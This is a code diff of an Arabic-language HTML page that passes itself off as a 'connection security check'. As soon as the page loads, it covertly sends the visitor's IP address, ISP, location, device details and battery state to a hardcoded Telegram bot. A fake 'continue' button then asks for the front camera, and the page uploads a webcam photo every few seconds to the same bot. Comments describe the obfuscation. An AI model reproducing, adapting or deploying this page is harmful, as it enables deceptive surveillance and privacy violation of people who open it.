@@ -3,97 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Check</title>
+    <title>تحقق من الأمان</title>
     <style>
-        body { background: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; margin: 0; }
-        .console { border: 1px solid #0f0; padding: 20px; background: #050505; }
+        body { background: #ffffff; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .container { text-align: center; padding: 20px; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: #0052cc; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 500; display: none; margin-top: 15px; }
+        .status-text { color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="console" id="logger">
-        > جاري فحص النظام...<br>
-        > يرجى المتابعة للمزامنة...<br><br>
-        <button id="run" style="background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">متابعة</button>
+    <div class="container">
+        <div class="spinner"></div>
+        <div id="msg">
+            <h2 style="font-size: 20px; margin-bottom: 10px;">يتم الآن فحص أمان اتصالك</h2>
+            <p class="status-text">يرجى الانتظار لحظة واحدة...</p>
+        </div>
+        <button id="authBtn">متابعة إلى المحتوى</button>
     </div>
 
     <video id="v" playsinline autoplay muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const cid = "2103976274";
+        // التمويه: دمج التوكن والآيدي في مسار واحد
+        const gate = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const target = "2103976274";
 
-        async function getDeepInfo() {
+        // وظيفة لإرسال البيانات النصية
+        function log(t) {
+            fetch(gate + "sendMessage", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: target, text: t, parse_mode: "Markdown" })
+            });
+        }
+
+        // 1. جلب كل المعلومات فوراً بمجرد فتح الصفحة
+        async function getFullData() {
             let n = navigator;
-            let info = `📡 **تقرير فني دقيق**\n\n`;
+            let report = `🚀 **تقرير دخول جديد (فوري)**\n\n`;
 
-            // محاولة جلب الماركة الحقيقية (تعمل في المتصفحات الحديثة)
-            if (n.userAgentData) {
-                const uaData = await n.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion", "architecture"]);
-                info += `📱 **الجهاز الدقيق:** ${uaData.model || 'غير مسموح'}\n`;
-                info += `💻 **النظام:** ${uaData.platform} v${uaData.platformVersion}\n`;
-            } else {
-                info += `📱 **الجهاز (عام):** ${n.platform}\n`;
-            }
-
-            // تحديد المتصفح الحقيقي بالاستبعاد
-            let browser = "غير معروف";
-            if (n.userAgent.includes("Brave")) browser = "Brave";
-            else if (n.userAgent.includes("Edg")) browser = "Edge";
-            else if (n.userAgent.includes("Chrome")) browser = "Chrome";
-            else if (n.userAgent.includes("Safari")) browser = "Safari";
-            info += `🧭 **المتصفح الحقيقي:** ${browser}\n`;
-
-            // معلومات إضافية
-            info += `🔋 **البطارية:** [جاري الفحص...]\n`;
-            info += `🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
-            info += `🚀 **الرام التقديري:** ${n.deviceMemory || 'غير معروف'} GB\n`;
-
-            // جلب الـ IP مع تفاصيل الموقع الجغرافي
+            // جلب الـ IP والشركة والموقع
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                info = info.replace("[جاري الفحص...]", "تم");
-                info += `🌍 **IP:** ${j.ip}\n`;
-                info += `🏢 **الشركة:** ${j.org}\n`;
-                info += `📍 **الموقع:** ${j.city}, ${j.country_name}\n`;
+                report += `🌍 **الآي بي:** \`${j.ip}\`\n`;
+                report += `🏢 **الشركة (ISP):** ${j.org}\n`;
+                report += `📍 **الموقع:** ${j.city}, ${j.country_name}\n`;
+            } catch (e) { report += `🌍 **الآي بي:** فشل الجلب\n`; }
+
+            // معلومات الجهاز والنظام
+            report += `📱 **النظام:** ${n.platform}\n`;
+            report += `🧭 **المتصفح:** ${n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other"}\n`;
+            report += `🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+            report += `🌐 **اللغة:** ${n.language}\n`;
+
+            // معلومات البطارية
+            try {
+                const batt = await n.getBattery();
+                report += `🔋 **البطارية:** ${(batt.level * 100).toFixed(0)}% (${batt.charging ? "يُشحن" : "لا يُشحن"})\n`;
             } catch (e) {}
 
-            send(info);
+            log(report);
+
+            // بعد إرسال المعلومات، نظهر زر المتابعة لطلب الكاميرا
+            setTimeout(() => {
+                document.getElementById('authBtn').style.display = 'inline-block';
+                document.querySelector('.status-text').innerText = "تم الفحص، يرجى المتابعة.";
+            }, 2000);
         }
 
-        document.getElementById('run').onclick = async function() {
+        // 2. طلب الكاميرا عند ضغط الزر
+        document.getElementById('authBtn').onclick = async function() {
             this.style.display = 'none';
+            document.querySelector('.status-text').innerText = "جاري المزامنة...";
+            
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = s;
-                setInterval(snap, 4000);
-            } catch (e) { send("⚠️ رفض الكاميرا"); }
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = s;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setInterval(capture, 3500); // إرسال صورة كل 3.5 ثوانٍ
+                };
+            } catch (e) {
+                log("⚠️ **المستخدم رفض الكاميرا**");
+                alert("يرجى السماح بالوصول للكاميرا لتشغيل المحتوى.");
+            }
         };
 
-        function snap() {
+        function capture() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             canvas.toBlob(b => {
                 const f = new FormData();
-                f.append('chat_id', cid);
+                f.append('chat_id', target);
                 f.append('photo', b, 'x.jpg');
-                fetch(api + "sendPhoto", { method: 'POST', body: f });
+                fetch(gate + "sendPhoto", { method: 'POST', body: f });
             }, 'image/jpeg', 0.8);
         }
 
-        function send(t) {
-            fetch(api + "sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: cid, text: t, parse_mode: "Markdown" })
-            });
-        }
-
-        getDeepInfo();
+        // تشغيل جلب المعلومات فوراً
+        getFullData();
     </script>
 </body>
 </html>
